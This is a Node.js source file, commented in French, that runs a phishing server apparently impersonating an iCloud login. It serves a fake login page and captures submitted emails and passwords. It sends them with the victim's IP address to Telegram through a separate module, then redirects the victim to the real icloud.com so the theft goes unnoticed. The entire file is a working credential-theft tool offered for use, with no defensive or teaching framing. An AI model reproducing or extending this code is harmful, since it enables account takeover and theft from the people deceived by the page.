const http = require('http');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const telegram = require('./telegram');
const { open } = require('open');

const PORT = 3000; // Port du serveur
const PHISHING_URL = process.env.PHISHING_URL || `http://localhost:${PORT}`;

// Fonction pour démarrer le serveur de phishing
const startPhishing = () => {
  const server = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/submit') {
      let body = '';

      req.on('data', chunk => {
        body += chunk.toString(); // Convertit le Buffer en chaîne
      });

      req.on('end', async () => {
        const params = new URLSearchParams(body);
        const email = params.get('email');
        const password = params.get('password');
        const ip = req.socket.remoteAddress;

        console.log(chalk.green(`Identifiants capturés: ${email}, ${password}`));

        // Envoi des identifiants à Telegram
        await telegram.sendCredentials({ email, password, ip });

        // Réponse au client
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h1>Connexion réussie</h1><p>Vous serez redirigé...</p><script>setTimeout(() => { window.location.href = "https://www.icloud.com"; }, 2000);</script>');
      });
    } else {
      // Servir le fichier HTML de phishing
      const filePath = path.join(__dirname, '../../public/index.html');
      fs.readFile(filePath, (err, data) => {
        if (err) {
          res.writeHead(500);
          return res.end('Erreur du serveur');
        }
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(data);
      });
    }
  });

  server.listen(PORT, () => {
    console.log(chalk.blue(`Serveur de phishing démarré sur ${PHISHING_URL}`));
    open(PHISHING_URL); // Ouvre le navigateur par défaut
  });
};

module.exports = { startPhishing };
